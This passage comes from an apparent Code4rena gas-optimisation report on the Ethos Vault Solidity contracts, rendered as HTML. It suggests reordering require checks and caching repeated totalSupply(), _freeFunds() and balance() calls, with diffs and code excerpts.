class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -68,6 +68,8 @@ abstract contract ReaperBaseStrategyv4 is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal onlyInitializing {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         __UUPSUpgradeable_init();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         __AccessControlEnumerable_init();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(_multisigRoles.length == 3, &quot;Invalid number of multisig roles&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         vault = _vault;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         want = _want;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -78,7 +80,6 @@ abstract contract ReaperBaseStrategyv4 is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _grantRole(STRATEGIST, _strategists[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(_multisigRoles.length == 3, &quot;Invalid number of multisig roles&quot;)</span></span></span></code></pre>\n<h3 id=\"reorder-the-require-statement-here-to-have-the-cheaper-one-before-the-gas-consuming-one\" style=\"position:relative;\"><a href=\"#reorder-the-require-statement-here-to-have-the-cheaper-one-before-the-gas-consuming-one\" aria-label=\"reorder the require statement here to have the cheaper one before the gas consuming one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reorder the require statement here to have the cheaper one before the gas consuming one</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L95-L103\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L95-L103</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">abstract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperBaseStrategyv4</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only vault can withdraw&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Amount cannot be zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;Ammount must be less than balance&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Cheaper checks should come before the more expensive ones.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol b/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index db020f2..71504f1 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -93,8 +93,8 @@ abstract contract ReaperBaseStrategyv4 is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      *      is deducted up-front.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function withdraw(uint256 _amount) external override returns (uint256 loss) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(msg.sender == vault, &quot;Only vault can withdraw&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_amount != 0, &quot;Amount cannot be zero&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(msg.sender == vault, &quot;Only vault can withdraw&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(_amount &lt;= balanceOf(), &quot;Ammount must be less than balance&quot;);</span></span></span></code></pre>\n<h3 id=\"the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" style=\"position:relative;\"><a href=\"#the-result-of-a-function-call-should-be-cached-rather-than-re-calling-the-function\" aria-label=\"the result of a function call should be cached rather than re calling the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The result of a function call should be cached rather than re-calling the function</h3>\n<p>External calls are expensive. Consider caching the following:</p>\n<h3 id=\"reapervaultv2sol_deposit-results-of-totalsupply-should-be-cachedsaves-1-call-on-sad-path\" style=\"position:relative;\"><a href=\"#reapervaultv2sol_deposit-results-of-totalsupply-should-be-cachedsaves-1-call-on-sad-path\" aria-label=\"reapervaultv2sol_deposit results of totalsupply should be cachedsaves 1 call on sad path permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultV2.sol._deposit(): Results of totalSupply() should be cached(saves 1 call on sad path)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L319-L338\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L319-L338</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">319</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_receiver</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">331</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">332</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">333</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">334</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()) / </span><span class=\"mtk12\">freeFunds</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// use &quot;freeFunds&quot; instead of &quot;pool&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">335</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<h3 id=\"reapervaulterc4626solconverttoshares-results-of-totalsupply-and-_freefunds-should-be-cached\" style=\"position:relative;\"><a href=\"#reapervaulterc4626solconverttoshares-results-of-totalsupply-and-_freefunds-should-be-cached\" aria-label=\"reapervaulterc4626solconverttoshares results of totalsupply and _freefunds should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultERC4626.sol.convertToShares(): Results of totalSupply() and _freeFunds() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L51-L54\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L51-L54</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()) / </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"reapervaulterc4626solconverttoassets-results-of-totalsupply-should-be-cached\" style=\"position:relative;\"><a href=\"#reapervaulterc4626solconverttoassets-results-of-totalsupply-should-be-cached\" aria-label=\"reapervaulterc4626solconverttoassets results of totalsupply should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultERC4626.sol.convertToAssets(): Results of totalSupply() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L66-L69\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L66-L69</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToAssets</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">()) / </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"reapervaulterc4626solmaxdeposit-balance-should-be-cached\" style=\"position:relative;\"><a href=\"#reapervaulterc4626solmaxdeposit-balance-should-be-cached\" aria-label=\"reapervaulterc4626solmaxdeposit balance should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultERC4626.sol.maxDeposit(): balance() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L79-L83\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L79-L83</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">maxDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxAssets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\"> || </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() &gt;= </span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"reapervaulterc4626solmaxmint-balance-should-be-cached\" style=\"position:relative;\"><a href=\"#reapervaulterc4626solmaxmint-balance-should-be-cached\" aria-label=\"reapervaulterc4626solmaxmint balance should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultERC4626.sol.maxMint(): balance() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L122-L126\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L122-L126</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">maxMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxShares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\"> || </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">() &gt;= </span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tvlCap</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">balance</span><span 